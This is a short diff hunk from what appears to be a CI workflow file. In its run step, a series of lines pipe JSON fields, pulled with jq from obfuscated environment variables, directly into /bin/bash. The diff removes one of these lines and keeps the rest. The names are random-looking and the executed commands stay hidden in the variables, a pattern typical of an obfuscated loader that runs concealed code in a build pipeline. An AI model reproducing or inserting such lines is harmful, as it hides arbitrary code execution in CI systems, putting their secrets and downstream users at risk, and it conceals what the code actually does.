@@ -42,7 +42,6 @@ jobs:
           echo $flvt591 | jq -r .lsw9 | /bin/bash
           printf '%s' "$kkag46274" | jq -r .lsmds848 | /bin/bash
           echo $nanph083 | jq -r .tomvb99 | /bin/bash
-          printf '%s' "$wglkj51" | jq -r .xpjc4 | /bin/bash
           printf '%s' "$x80135" | jq -r .divuv31438 | /bin/bash
           echo $e621 | jq -r .hzg2260 | /bin/bash
           echo $zfcrw49036 | jq -r .jnn81756 | /bin/bash
